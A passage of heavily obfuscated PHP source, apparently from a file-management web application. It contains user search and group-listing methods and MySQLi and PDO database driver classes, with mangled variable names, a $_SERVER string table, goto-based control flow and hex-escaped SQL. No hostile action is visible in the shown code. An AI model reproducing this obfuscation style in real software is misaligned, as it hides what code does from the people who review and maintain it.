_makeOrder($”ş¹±úŒ = '') { $Â“Ê³«û =& $_SERVER[³½¬ÚË¯]; $©ø„Ãà× = array($Â“Ê³«û[1690], $Â“Ê³«û[32], $Â“Ê³«û[1877], $Â“Ê³«û[1849], $Â“Ê³«û[215]); $šĞ˜¦¤ = array($Â“Ê³«û[491] => $Â“Ê³«û[492], $Â“Ê³«û[493] => $Â“Ê³«û[494]); $äÁ³©è = Input::get($Â“Ê³«û[498], $Â“Ê³«û[7], $Â“Ê³«û[1681], $©ø„Ãà×); $ÂŸÁı’ = Input::get($Â“Ê³«û[499], $Â“Ê³«û[7], $Â“Ê³«û[1979], array($Â“Ê³«û[1979], $Â“Ê³«û[493])); $ÂŸÁı’ = $šĞ˜¦¤[$ÂŸÁı’]; $”ş¹±úŒ = $”ş¹±úŒ . "\165\163\145\162\x2e{$äÁ³©è}\40{$ÂŸÁı’}\x2c\x20\x75\x73\145\x72\56\x75\163\x65\x72\x49\x44\40\141\x73\x63"; return $this->alias($Â“Ê³«û[2105])->order($”ş¹±úŒ); } public function listSearch($ÊÃëÂåî) { $¥€úÙ—Ñ =& $_SERVER[³½¬ÚË¯]; $ï•ÇÄä = $ÊÃëÂåî[$¥€úÙ—Ñ[1982]]; $ÍşûêÛ¤ = isset($ÊÃëÂåî[$¥€úÙ—Ñ[1983]]) ? $ÊÃëÂåî[$¥€úÙ—Ñ[1983]] : !1; $ï•ÇÄä = str_replace($¥€úÙ—Ñ[1984], $¥€úÙ—Ñ[1985], trim($ï•ÇÄä)); $äÆÚğâ = array($¥€úÙ—Ñ[32] => array($¥€úÙ—Ñ[427], "\x25{$ï•ÇÄä}\45"), $¥€úÙ—Ñ[349] => array($¥€úÙ—Ñ[427], "{$ï•ÇÄä}\45"), $¥€úÙ—Ñ[2170] => array($¥€úÙ—Ñ[427], "{$ï•ÇÄä}\x25"), $¥€úÙ—Ñ[1043] => $¥€úÙ—Ñ[1986]); if (Input::check($ï•ÇÄä, $¥€úÙ—Ñ[355])) { $äÆÚğâ[$¥€úÙ—Ñ[1690]] = array($¥€úÙ—Ñ[427], "{$ï•ÇÄä}\x25"); $äÆÚğâ[$¥€úÙ—Ñ[2361]] = array($¥€úÙ—Ñ[427], "{$ï•ÇÄä}\45"); } if (!$ï•ÇÄä) { $äÆÚğâ = array(); } if (isset($ÊÃëÂåî[$¥€úÙ—Ñ[786]])) { $äÆÚğâ[$¥€úÙ—Ñ[786]] = $ÊÃëÂåî[$¥€úÙ—Ñ[786]]; } $äÆÚğâ = $this->parseWhereLike($äÆÚğâ); $š†­˜ª¸ = $this->_makeOrder()->where($äÆÚğâ)->selectPage(20); if (!$š†­˜ª¸ || count($š†­˜ª¸[$¥€úÙ—Ñ[413]]) < 5 && Input::check($ï•ÇÄä, $¥€úÙ—Ñ[362])) { $™ûåÏ´ = $this->_searchFromMeta($¥€úÙ—Ñ[505], $ï•ÇÄä, 10); $‡Î™Æ = $this->_searchFromMeta($¥€úÙ—Ñ[506], $ï•ÇÄä, 10); $Á¶ŠÅ™Î = array_merge($™ûåÏ´, $‡Î™Æ, $š†­˜ª¸[$¥€úÙ—Ñ[413]]); $š†­˜ª¸[$¥€úÙ—Ñ[413]] = array_unique_by_key($Á¶ŠÅ™Î, $¥€úÙ—Ñ[1690]); $š†­˜ª¸[$¥€úÙ—Ñ[410]][$¥€úÙ—Ñ[411]] = count($š†­˜ª¸[$¥€úÙ—Ñ[413]]); $š†­˜ª¸[$¥€úÙ—Ñ[410]][$¥€úÙ—Ñ[412]] = ceil($š†­˜ª¸[$¥€úÙ—Ñ[410]][$¥€úÙ—Ñ[411]] / $š†­˜ª¸[$¥€úÙ—Ñ[410]][$¥€úÙ—Ñ[407]]); } $this->_listDataApply($š†­˜ª¸[$¥€úÙ—Ñ[413]]); $this->_filterByGroup($š†­˜ª¸, $ÍşûêÛ¤); return $š†­˜ª¸; } private function _filterByGroup(&$‰©œáÅÇ, $àˆôòÍ°) { $Îö¹ÈıÀ =& $_SERVER[³½¬ÚË¯]; if (!$àˆôòÍ°) { return $‰©œáÅÇ; } foreach ($‰©œáÅÇ[$Îö¹ÈıÀ[413]] as $çÔ¦±ª => &$ÄøË³êÛ) { $Öà‰ğÍé = array_to_keyvalue($ÄøË³êÛ[$Îö¹ÈıÀ[2075]], $Îö¹ÈıÀ[12], $Îö¹ÈıÀ[1888]); if (!in_array($àˆôòÍ°, $Öà‰ğÍé)) { unset($‰©œáÅÇ[$Îö¹ÈıÀ[413]][$çÔ¦±ª]); } } unset($ÄøË³êÛ); $‰©œáÅÇ[$Îö¹ÈıÀ[413]] = array_values($‰©œáÅÇ[$Îö¹ÈıÀ[413]]); $‰©œáÅÇ[$Îö¹ÈıÀ[410]] = array($Îö¹ÈıÀ[2140] => count($‰©œáÅÇ[$Îö¹ÈıÀ[413]]), $Îö¹ÈıÀ[2138] => $‰©œáÅÇ[$Îö¹ÈıÀ[410]][$Îö¹ÈıÀ[407]], $Îö¹ÈıÀ[2137] => 1, $Îö¹ÈıÀ[2139] => 1); } private function _searchFromMeta($ùÖş¨â£, $››»ñì¼, $î­€éŞƒ) { $ûÈ¨¿«¿ =& $_SERVER[³½¬ÚË¯]; $››»ñì¼ = strtolower($››»ñì¼); $üîµĞˆø = array($ûÈ¨¿«¿[94] => $ùÖş¨â£, $ûÈ¨¿«¿[418] => array($ûÈ¨¿«¿[427], "\x25{$››»ñì¼}\45")); $üîµĞˆø = $this->parseWhereLike($üîµĞˆø); $ø´ˆ£Å© = Model($ûÈ¨¿«¿[2380])->where($üîµĞˆø)->limit($î­€éŞƒ)->select(); if (!$ø´ˆ£Å©) { return array(); } $ø´ˆ£Å© = array_to_keyvalue($ø´ˆ£Å©, $ûÈ¨¿«¿[12], $ûÈ¨¿«¿[1690]); $éºïññ¡ = $this->where(array($ûÈ¨¿«¿[1681] => array($ûÈ¨¿«¿[7], $ø´ˆ£Å©)))->select(); if (!$éºïññ¡) { return array(); } return $éºïññ¡; } private function _listDataApplyItem($ˆ±¯ä…Ô) { $¯Ô˜®Ç… = array($ˆ±¯ä…Ô); $this->_listDataApply($¯Ô˜®Ç…); return $¯Ô˜®Ç…[0]; } private function _listDataApply(&$û£›¢é•) { $Ø˜‡±°Ş =& $_SERVER[³½¬ÚË¯]; if (!$û£›¢é•) { return; } array_remove_key($û£›¢é•, $Ø˜‡±°Ş[932]); $Ò©¯¸” = array_to_keyvalue($û£›¢é•, $Ø˜‡±°Ş[12], $Ø˜‡±°Ş[1690]); $this->_listAppendGroup($û£›¢é•, $Ò©¯¸”); $this->_listAppendMeta($û£›¢é•, $Ò©¯¸”); $this->_listAppendSourceRoot($û£›¢é•, $Ò©¯¸”); } private function _listAppendSourceRoot(&$§ÎİºÄÓ, $µ²Ì¢çŞ) { $å…ù¯¹ =& $_SERVER[³½¬ÚË¯]; $›µ§¶Ë¥ = Model($å…ù¯¹[861])->listSourceRoot(SourceModel::TYPE_USER, $µ²Ì¢çŞ); $›µ§¶Ë¥ = array_to_keyvalue($›µ§¶Ë¥, $å…ù¯¹[539]); $›µ§¶Ë¥ = array_remove_key($›µ§¶Ë¥, $å…ù¯¹[539]); foreach ($§ÎİºÄÓ as &$¿®¸ê»µ) { $¿®¸ê»µ[$å…ù¯¹[87]] = $›µ§¶Ë¥[$¿®¸ê»µ[$å…ù¯¹[1690]]] ? $›µ§¶Ë¥[$¿®¸ê»µ[$å…ù¯¹[1690]]] : array(); } unset($¿®¸ê»µ); } private function _listAppendGroup(&$ÔÁ°š°®, $ê–¤ØÎÂ) { $€÷Ù¹Â =& $_SERVER[³½¬ÚË¯]; $ÌÊÛŒ÷ª = array($€÷Ù¹Â[1690] => array($€÷Ù¹Â[7], $ê–¤ØÎÂ)); $ùíÏ­õĞ = Model($€÷Ù¹Â[1978])->where($ÌÊÛŒ÷ª)->select(); $·üÕ¾² = array_to_keyvalue($ùíÏ­õĞ, $€÷Ù¹Â[12], $€÷Ù¹Â[1888]); $·üÕ¾² = array_remove_value(array_unique($·üÕ¾²), $€÷Ù¹Â[212]); if (!$·üÕ¾² || !$ùíÏ­õĞ) { return; } $ÌÊÛŒ÷ª = array($€÷Ù¹Â[1888] => array($€÷Ù¹Â[7], $·üÕ¾²)); $ÔÇ–Ò¦ = Model($€÷Ù¹Â[2073])->field($€÷Ù¹Â[2381])->where($ÌÊÛŒ÷ª)->select(); $ÔÇ–Ò¦ = array_to_keyvalue($ÔÇ–Ò¦, $€÷Ù¹Â[1888]); $ùíÏ­õĞ = array_to_keyvalue_group($ùíÏ­õĞ, $€÷Ù¹Â[1690]); foreach ($ùíÏ­õĞ as &$×ªÚ‰ä£) { $”ıòòƒ¶ = array(); foreach ($×ªÚ‰ä£ as $¶ÖŞ˜ÇË) { if (!$¶ÖŞ˜ÇË[$€÷Ù¹Â[1992]]) { continue; } $÷©›«á• = Model($€÷Ù¹Â[541])->listData($¶ÖŞ˜ÇË[$€÷Ù¹Â[1992]]); $”ıòòƒ¶[] = array($€÷Ù¹Â[1888] => $¶ÖŞ˜ÇË[$€÷Ù¹Â[1888]], $€÷Ù¹Â[2382] => $ÔÇ–Ò¦[$¶ÖŞ˜ÇË[$€÷Ù¹Â[1888]]][$€÷Ù¹Â[32]], $€÷Ù¹Â[554] => $ÔÇ–Ò¦[$¶ÖŞ˜ÇË[$€÷Ù¹Â[1888]]][$€÷Ù¹Â[554]], $€÷Ù¹Â[455] => $÷©›«á•); } $×ªÚ‰ä£ = $”ıòòƒ¶; } unset($×ªÚ‰ä£); foreach ($ÔÁ°š°® as &$Ù‰¬ÍÇú) { $Ù‰¬ÍÇú[$€÷Ù¹Â[2075]] = array(); if (isset($ùíÏ­õĞ[$Ù‰¬ÍÇú[$€÷Ù¹Â[1690]]])) { $Ù‰¬ÍÇú[$€÷Ù¹Â[2075]] = $ùíÏ­õĞ[$Ù‰¬ÍÇú[$€÷Ù¹Â[1690]]]; } } unset($Ù‰¬ÍÇú); } public function userAppendGroup($º¼Ë¸ó×) { $ ø’°Ûë =& $_SERVER[³½¬ÚË¯]; if (!$º¼Ë¸ó×) { return array(); } $this->_listAppendGroup($º¼Ë¸ó×, array_to_keyvalue($º¼Ë¸ó×, $ ø’°Ûë[12], $ ø’°Ûë[1690])); return $º¼Ë¸ó×; } private function _listAppendMeta(&$ÆïÒÄ¬÷, $ŞÕ§·ûô) { $†ÌÖï–¿ =& $_SERVER[³½¬ÚË¯]; $¾Á¡«ûú = UserJobModel::JOB_KEY; $ÀÈù¢¯¾ = array($†ÌÖï–¿[2362]); $°ù„İÀ¤ = array($†ÌÖï–¿[1690] => array($†ÌÖï–¿[7], $ŞÕ§·ûô)); $şö”ôåÇ = Model($†ÌÖï–¿[2360])->where($°ù„İÀ¤)->select(); $şö”ôåÇ = array_to_keyvalue_group($şö”ôåÇ, $†ÌÖï–¿[1690]); foreach ($şö”ôåÇ as &$áš’­ÜÎ) { $õ¡ØîÜƒ = array(); foreach ($áš’­ÜÎ as $òÃ¸Á) { if (!in_array($òÃ¸Á[$†ÌÖï–¿[94]], $ÀÈù¢¯¾)) { $õ¡ØîÜƒ[$òÃ¸Á[$†ÌÖï–¿[94]]] = $òÃ¸Á[$†ÌÖï–¿[418]]; } } $áš’­ÜÎ = $õ¡ØîÜƒ; } unset($áš’­ÜÎ); $¶½Ã…  = Model($†ÌÖï–¿[2383]); foreach ($ÆïÒÄ¬÷ as &$ÃŞ£Ş”«) { $½¦°”Ç² = array(); if (isset($şö”ôåÇ[$ÃŞ£Ş”«[$†ÌÖï–¿[1690]]])) { $½¦°”Ç² = $şö”ôåÇ[$ÃŞ£Ş”«[$†ÌÖï–¿[1690]]]; } $ÃŞ£Ş”«[$†ÌÖï–¿[2384]] = array(); if (isset($½¦°”Ç²[$¾Á¡«ûú])) { $ÃŞ£Ş”«[$†ÌÖï–¿[2384]] = $¶½Ã… ->getUserJobInfo($½¦°”Ç²[$¾Á¡«ûú]); } } unset($ÃŞ£Ş”«); } protected function groupUserAll($æÁÅâø) { $†ª„§ï‡ =& $_SERVER[³½¬ÚË¯]; if (!$æÁÅâø) { return !1; } $¨´óôò± = Model($†ª„§ï‡[1978])->field($†ª„§ï‡[1690])->where(array($†ª„§ï‡[1888] => array($†ª„§ï‡[7], $æÁÅâø)))->select(); $¨´óôò± = array_to_keyvalue($¨´óôò±, $†ª„§ï‡[12], $†ª„§ï‡[1690]); return array_unique($¨´óôò±); } public function userSearch($¾ƒíÏóÌ, $İ“Ïğ“œ = "\x2a") { return Model($_SERVER[³½¬ÚË¯][568])->where($¾ƒíÏóÌ)->field($İ“Ïğ“œ)->find(); } } goto eğšÕùµßğ; AÍªæ •Â: class DbMysqli extends Db { public function __construct($æ¦Ó©ùŒ = '') { $÷¹—é¦µ =& $_SERVER[³½¬ÚË¯]; if (!extension_loaded($÷¹—é¦µ[955])) { think_exception(think_lang($÷¹—é¦µ[14]) . $÷¹—é¦µ[956]); } if (!empty($æ¦Ó©ùŒ)) { $this->config = $æ¦Ó©ùŒ; if (empty($this->config[$÷¹—é¦µ[17]])) { $this->config[$÷¹—é¦µ[17]] = $÷¹—é¦µ[12]; } } } public function connect($Ş¥Ô§“Ä = '', $ß°ö¿¿Ü = 0) { $ìñÑœè¬ =& $_SERVER[³½¬ÚË¯]; if (!isset($this->linkID[$ß°ö¿¿Ü])) { if (empty($Ş¥Ô§“Ä)) { $Ş¥Ô§“Ä = $this->config; } $this->linkID[$ß°ö¿¿Ü] = new mysqli($Ş¥Ô§“Ä[$ìñÑœè¬[929]], $Ş¥Ô§“Ä[$ìñÑœè¬[931]], $Ş¥Ô§“Ä[$ìñÑœè¬[932]], $Ş¥Ô§“Ä[$ìñÑœè¬[21]], $Ş¥Ô§“Ä[$ìñÑœè¬[930]] ? intval($Ş¥Ô§“Ä[$ìñÑœè¬[930]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ëöê“¨× = $this->linkID[$ß°ö¿¿Ü]->server_version; $this->linkID[$ß°ö¿¿Ü]->query($ìñÑœè¬[933] . think_config($ìñÑœè¬[934]) . $ìñÑœè¬[58]); if ($ëöê“¨× > $ìñÑœè¬[935]) { $this->linkID[$ß°ö¿¿Ü]->query($ìñÑœè¬[936]); } $this->connected = !0; if (1 != think_config($ìñÑœè¬[22])) { unset($this->config); } } return $this->linkID[$ß°ö¿¿Ü]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ë©ÛÁ…¼) { $æàÀşËÖ =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ë©ÛÁ…¼; if ($this->queryID) { $this->free(); } think_action_status($æàÀşËÖ[23], 1); think_status($æàÀşËÖ[24]); $this->queryID = $this->_linkID->query($ë©ÛÁ…¼); if ($this->_linkID->more_results()) { while (($¦·Ì·š = $this->_linkID->next_result()) != NULL) { $¦·Ì·š->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ãÆ´–í°) { $§Ÿåœ‰¨ =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ãÆ´–í°; if ($this->queryID) { $this->free(); } think_action_status($§Ÿåœ‰¨[25], 1); think_status($§Ÿåœ‰¨[24]); $½úî¥¤Ğ = $this->_linkID->query($ãÆ´–í°); $this->debug(); if (!1 === $½úî¥¤Ğ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ø©±ƒš˜ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ø©±ƒš˜) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨°¡áìá = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¨°¡áìá) { $this->error(); return !1; } } return !0; } private function getAll() { $òø† = array(); if ($this->numRows > 0) { for ($ò•Šõşï = 0; $ò•Šõşï < $this->numRows; $ò•Šõşï++) { $òø†[$ò•Šõşï] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $òø†; } public function getFields($ÔŠ¦¸ãÙ) { $·Õ„§û‚ =& $_SERVER[³½¬ÚË¯]; $‹šááâ© = $this->query($·Õ„§û‚[940] . $this->parseKey($ÔŠ¦¸ãÙ)); $Åğ»‰µÑ = array(); if ($‹šááâ©) { foreach ($‹šááâ© as $¢­œƒ² => $øèÇ”›ª) { $Åğ»‰µÑ[$øèÇ”›ª[$·Õ„§û‚[31]]] = array($·Õ„§û‚[32] => $øèÇ”›ª[$·Õ„§û‚[31]], $·Õ„§û‚[33] => $øèÇ”›ª[$·Õ„§û‚[34]], $·Õ„§û‚[35] => (bool) ($øèÇ”›ª[$·Õ„§û‚[36]] === $·Õ„§û‚[12]), $·Õ„§û‚[37] => $øèÇ”›ª[$·Õ„§û‚[38]], $·Õ„§û‚[39] => strtolower($øèÇ”›ª[$·Õ„§û‚[40]]) == $·Õ„§û‚[41], $·Õ„§û‚[42] => strtolower($øèÇ”›ª[$·Õ„§û‚[43]]) == $·Õ„§û‚[44]); } } return $Åğ»‰µÑ; } public function getTables($’ô£‚æ = '') { $›ä›¤â¬ =& $_SERVER[³½¬ÚË¯]; $‹¯í€·¯ = !empty($’ô£‚æ) ? $›ä›¤â¬[942] . $’ô£‚æ . $›ä›¤â¬[943] : $›ä›¤â¬[944]; $Œì÷¨Ù¬ = $this->query($‹¯í€·¯); $™™Ç®°Ô = array(); if ($Œì÷¨Ù¬) { foreach ($Œì÷¨Ù¬ as $‘›¹ÄÙÆ => $€àê‘èš) { $™™Ç®°Ô[$‘›¹ÄÙÆ] = current($€àê‘èš); } } return $™™Ç®°Ô; } public function replace($ŒşÀ–”, $¦“Ò = array()) { $°óñÚŞ =& $_SERVER[³½¬ÚË¯]; foreach ($ŒşÀ–” as $¸Ë³§éæ => $ê‰±­ïá) { $İÁ¿©Úì = $this->parseValue($ê‰±­ïá); if (is_scalar($İÁ¿©Úì)) { $ñÛù§í[] = $İÁ¿©Úì; $Ú¡—’òò[] = $this->parseKey($¸Ë³§éæ); } } $šîÍç²€ = $°óñÚŞ[945] . $this->parseTable($¦“Ò[$°óñÚŞ[323]]) . $°óñÚŞ[946] . implode($°óñÚŞ[50], $Ú¡—’òò) . $°óñÚŞ[947] . implode($°óñÚŞ[50], $ñÛù§í) . $°óñÚŞ[948]; return $this->execute($šîÍç²€); } public function insertAll($÷øûÛ„œ, $¶õûÅæÅ = array(), $×î˜ıçã = false) { $ë×ëãôŸ =& $_SERVER[³½¬ÚË¯]; if (!is_array($÷øûÛ„œ[0])) { return !1; } $—’­óÕæ = array_keys($÷øûÛ„œ[0]); $Ÿ·Ä•£ = array(); foreach ($÷øûÛ„œ as $›“´¿íê) { $š¡éäá = array(); foreach ($›“´¿íê as $ûÔå²’î => $å«ÃÚÃ) { $å«ÃÚÃ = $this->parseValue($å«ÃÚÃ); if (is_scalar($å«ÃÚÃ)) { $š¡éäá[] = $å«ÃÚÃ; } } $Ÿ·Ä•£[] = $ë×ëãôŸ[304] . implode($ë×ëãôŸ[50], $š¡éäá) . $ë×ëãôŸ[948]; } array_walk($—’­óÕæ, array($this, $ë×ëãôŸ[949])); $ÉîÂŸâä = $×î˜ıçã ? $ë×ëãôŸ[950] : $ë×ëãôŸ[951]; $ì ¦®ŠÕ = $ÉîÂŸâä . $ë×ëãôŸ[952] . $this->parseTable($¶õûÅæÅ[$ë×ëãôŸ[323]]) . $ë×ëãôŸ[946] . implode($ë×ëãôŸ[50], $—’­óÕæ) . $ë×ëãôŸ[953] . implode($ë×ëãôŸ[50], $Ÿ·Ä•£); return $this->execute($ì ¦®ŠÕ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $øùùóÄ„ =& $_SERVER[³½¬ÚË¯]; $this->error = $this->_linkID->errno . $øùùóÄ„[4] . $this->_linkID->error; if ($øùùóÄ„[12] != $this->queryStr) { $this->error .= LNG($øùùóÄ„[48]) . $this->queryStr; } think_trace($this->error, $øùùóÄ„[12], $øùùóÄ„[49]); return $this->error; } public function escapeString($Œ¡î¶»Ñ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Œ¡î¶»Ñ); } else { return addslashes($Œ¡î¶»Ñ); } } public function parseKey(&$±¯´ãÍ±, $şÁÅÇÂø = true) { $ÎóÓ¼Ç =& $_SERVER[³½¬ÚË¯]; if ($şÁÅÇÂø) { $±¯´ãÍ± = $this->parseKeyCheck($±¯´ãÍ±); } if ($±¯´ãÍ± != $ÎóÓ¼Ç[203] && !preg_match($ÎóÓ¼Ç[954], $±¯´ãÍ±)) { $±¯´ãÍ± = $ÎóÓ¼Ç[429] . trim($±¯´ãÍ±, $ÎóÓ¼Ç[429]) . $ÎóÓ¼Ç[429]; } return $±¯´ãÍ±; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($©‰²‘…¥ = '') { $õ½ØÉ‡õ =& $_SERVER[³½¬ÚË¯]; if (!class_exists($õ½ØÉ‡õ[957])) { think_exception(think_lang($õ½ØÉ‡õ[14]) . $õ½ØÉ‡õ[958]); } if (!empty($©‰²‘…¥)) { $this->config = $©‰²‘…¥; if (empty($this->config[$õ½ØÉ‡õ[17]])) { $this->config[$õ½ØÉ‡õ[17]] = array(); } } } public function connect($¡Ç›ºØĞ = '', $Æ†ñ‘á¢ = 0) { $„ÇØÈÜ» =& $_SERVER[³½¬ÚË¯]; if (!isset($this->linkID[$Æ†ñ‘á¢])) { if (empty($¡Ç›ºØĞ)) { $¡Ç›ºØĞ = $this->config; } $ßŠ§òâ = !empty($¡Ç›ºØĞ[$„ÇØÈÜ»[17]][$„ÇØÈÜ»[18]]) ? $¡Ç›ºØĞ[$„ÇØÈÜ»[17]][$„ÇØÈÜ»[18]] : $this->pconnect; if ($ßŠ§òâ) { $¡Ç›ºØĞ[$„ÇØÈÜ»[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Æ†ñ‘á¢] = new PDO($¡Ç›ºØĞ[$„ÇØÈÜ»[959]], $¡Ç›ºØĞ[$„ÇØÈÜ»[931]], $¡Ç›ºØĞ[$„ÇØÈÜ»[932]], $¡Ç›ºØĞ[$„ÇØÈÜ»[17]]); } catch (PDOException $§„ñÄ¥) { think_exception($§„ñÄ¥->getMessage()); } $this->dbType = $this->_getDsnType($¡Ç›ºØĞ[$„ÇØÈÜ»[959]]); if (in_array($this->dbType, array($„ÇØÈÜ»[960], $„ÇØÈÜ»[961], $„ÇØÈÜ»[962], $„ÇØÈÜ»[963]))) { think_exception($„ÇØÈÜ»[964] . $this->dbType . $„ÇØÈÜ»[965] . $this->dbType . $„ÇØÈÜ»[966]); } if (!$this->linkID[$Æ†ñ‘á¢]) { think_exception($„ÇØÈÜ»[967]); } try { $this->linkID[$Æ†ñ‘á¢]->exec($„ÇØÈÜ»[968] . think_config($„ÇØÈÜ»[934])); } catch (Exception $§„ñÄ¥) { } $this->connected = !0; if (1 != think_config($„ÇØÈÜ»[22])) { unset($this->config); } } return $this->linkID[$Æ†ñ‘á¢]; } public function free() { $this->PDOStatement = null; } public function query($óÑ¬ Ç, $ùÏ¹¹¬ = array()) { $Ü³­¡Ğ’ =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $óÑ¬ Ç; if (!empty($ùÏ¹¹¬)) { $this->queryStr .= $Ü³­¡Ğ’[969] . print_r($ùÏ¹¹¬, !0) . $Ü³­¡Ğ’[970]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ü³­¡Ğ’[23], 1); think_status($Ü³­¡Ğ’[24]); $this->PDOStatement = $this->_linkID->prepare($óÑ¬ Ç); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¿”ÔŞî¶ = $this->PDOStatement->execute($ùÏ¹¹¬); $this->debug(); if (!1 === $¿”ÔŞî¶) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Äşâ´Î, $¿–©ûÊŸ = array()) { $ì ¼ôô =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Äşâ´Î; if (!empty($¿–©ûÊŸ)) { $this->queryStr .= $ì ¼ôô[969] . print_r($¿–©ûÊŸ, !0) . $ì ¼ôô[970]; } $‰¨ÃÇœŞ = !1; if ($this->dbType == $ì ¼ôô[963]) { if (preg_match($ì ¼ôô[971], $this->queryStr, $¸½„ïÃº)) { $this->table = think_config($ì ¼ôô[972]) . str_ireplace(think_config($ì ¼ôô[973]), $ì ¼ôô[422], $¸½„ïÃº[2]); $‰¨ÃÇœŞ = (bool) $this->query($ì ¼ôô[974] . strtoupper($this->table) . $ì ¼ôô[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ì ¼ôô[25], 1); think_status($ì ¼ôô[24]); $this->PDOStatement = $this->_linkID->prepare($Äşâ´Î); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $©õ²ò«İ = $this->PDOStatement->execute($¿–©ûÊŸ); $this->debug(); if (!1 === $©õ²ò«İ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($‰¨ÃÇœŞ || preg_match($ì ¼ôô[975], $Äşâ´Î)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $—Â¾¬­î = $this->_linkID->commit(); $this->transTimes = 0; if (!$—Â¾¬­î) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Õˆ‚ñğ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Õˆ‚ñğ) { $this->error(); return !1; } } return !0; } private function getAll() { $ø÷éìÇ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ø÷éìÇ); return $ø÷éìÇ; } public function getFields($¢±ÛûÄ…) { $‹Ü˜ÈÚ¥ =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!0); if (think_config($‹Ü˜ÈÚ¥[976])) { $µ•ÜÈ…÷ = str_replace($‹Ü˜ÈÚ¥[977], $¢±ÛûÄ…, think_config($‹Ü˜ÈÚ¥[976])); } else { switch ($this->dbType) { case $‹Ü˜ÈÚ¥[960]: case $‹Ü˜ÈÚ¥[978]: $µ•ÜÈ…÷ = "\123\105\x4c\x45\x43\x54\40\x20\40\x63\x6f\154\x75\155\156\137\x6e\x61\155\145\x20\x61\x73\x20\47\116\141\155\x65\47\x2c\x20\x20\40\144\x61\x74\x61\137\x74\x79\160\x65\x20\x61\x73\40\x27\x54\171\x70\x65\x27\54\x20\x20\x20\x63\157\x6c\165\155\x6e\137\x64\x65\x66\141\165\x6c\164\40\141\163\40\47\x44\145\x66\x61\165\x6c\x74\x27\54\x20\40\x20\x69\163\x5f\156\x75\154\x6c\141\x62\x6c\145\x20\141\163\40\47\116\165\x6c\x6c\47\12\11\x9\x46\x52\117\115\x9\x69\156\x66\x6f\162\x6d\x61\x74\x69\x6f\x6e\137\x73\143\150\x65\x6d\141\x2e\x74\x61\142\154\145\163\40\x41\x53\40\164\12\x9\11\112\x4f\111\116\11\151\x6e\x66\157\x72\x6d\141\x74\151\x6f\156\x5f\163\x63\150\x65\x6d\x61\56\143\157\x6c\165\x6d\156\163\x20\101\x53\40\143\12\x9\x9\117\116\40\x20\x74\x2e\x74\141\142\154\x65\137\x63\141\x74\x61\x6c\157\x67\40\x3d\x20\x63\x2e\x74\x61\142\x6c\145\x5f\143\x61\x74\x61\154\157\147\12\x9\11\x41\x4e\x44\40\x74\56\x74\141\142\154\145\137\163\x63\x68\145\155\x61\x20\x3d\40\x63\56\x74\x61\x62\154\x65\137\163\x63\x68\145\x6d\141\12\x9\x9\101\x4e\x44\40\x74\56\164\141\142\154\x65\x5f\156\141\155\145\40\75\40\x63\56\164\141\x62\154\x65\x5f\156\x61\155\x65\xa\x9\x9\x57\x48\x45\x52\105\x20\40\x20\x74\56\x74\x61\142\x6c\145\x5f\156\x61\x6d\145\40\75\x20\x27{$¢±ÛûÄ…}\47"; break; case $‹Ü˜ÈÚ¥[979]: $µ•ÜÈ…÷ = $‹Ü˜ÈÚ¥[980] . $¢±ÛûÄ… . $‹Ü˜ÈÚ¥[981]; break; case $‹Ü˜ÈÚ¥[961]: case $‹Ü˜ÈÚ¥[963]: $µ•ÜÈ…÷ = $‹Ü˜ÈÚ¥[982] . $‹Ü˜ÈÚ¥[983] . $‹Ü˜ÈÚ¥[984] . strtoupper($¢±ÛûÄ…) . $‹Ü˜ÈÚ¥[985] . strtoupper($¢±ÛûÄ…) . $‹Ü˜ÈÚ¥[986]; break; case $‹Ü˜ÈÚ¥[987]: $µ•ÜÈ…÷ = $‹Ü˜ÈÚ¥[988] . $¢±ÛûÄ… . $‹Ü˜ÈÚ¥[989]; break; case $‹Ü˜ÈÚ¥[962]: break; case $‹Ü˜ÈÚ¥[990]: default: $µ•ÜÈ…÷ = $‹Ü˜ÈÚ¥[991] . ($this->dbType == $‹Ü˜ÈÚ¥[990] ? "\140{$¢±ÛûÄ…}\x60" : $¢±ÛûÄ…); } } $îŠâ­¹§ = $this->query($µ•ÜÈ…÷); $ëÂÁŒº = array(); if ($îŠâ­¹§) { foreach ($îŠâ­¹§ as 